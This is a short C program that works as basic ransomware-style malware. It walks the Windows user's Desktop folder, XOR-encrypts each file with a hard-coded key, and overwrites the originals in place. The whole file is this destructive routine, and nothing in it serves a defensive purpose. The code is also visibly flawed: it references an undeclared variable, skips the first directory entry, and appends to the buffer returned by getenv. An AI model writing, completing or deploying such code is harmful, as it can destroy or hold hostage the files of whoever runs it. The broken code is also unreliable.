#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>

void Encrypt(char *key, char *desktopPath) {
    DIR *dir;
    struct dirent *entry;

    dir = opendir(desktopPath);
    if (dir == NULL) {
        printf("Error: Unable to open desktop folder.\n");
        return;
    }
    
    entry = readdir(dir);
    if (entry == NULL) {
        printf("Error: Unable to read directory entry.\n");
        return;
    }
    
    while ((entry = readdir(dir)) != NULL) { // Loop through each file in desktop folder
        if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) { // Ignore "." and ".." directories
            char path[1024];
            sprintf(path, "%s\\%s", desktopPath, entry->d_name); // Get full file path
            FILE *file = fopen(path, "rb");
            if (file) {
                fseek(file, 0L, SEEK_END);
                long size = ftell(file);
                fseek(file, 0L, SEEK_SET);
                char* buffer = malloc(size);
                fread(buffer, sizeof(char), size, file);
                fclose(file);

                // Encrypt file buffer
                for (int i = 0; i < fileSize; i++) {
                    buffer[i] = buffer[i] ^ key[i % strlen(key)];
                }

                FILE *encrypted = fopen(path, "wb");
                fwrite(buffer, sizeof(char), size, encrypted);
                fclose(encrypted);
                free(buffer);
                buffer = NULL;
            }
        }
    }
    
    closedir(dir);
    
}

int main(int argc, const char * argv[]) {
    char* key = "key_to_enc_and_dec";
    char* path = getenv("USERPROFILE");
    if (!(path == NULL)) {
        strcat(path, "\\Desktop"); // Append "\Desktop" to path
    }
    
    Encrypt(key, path);
    return 1;

}
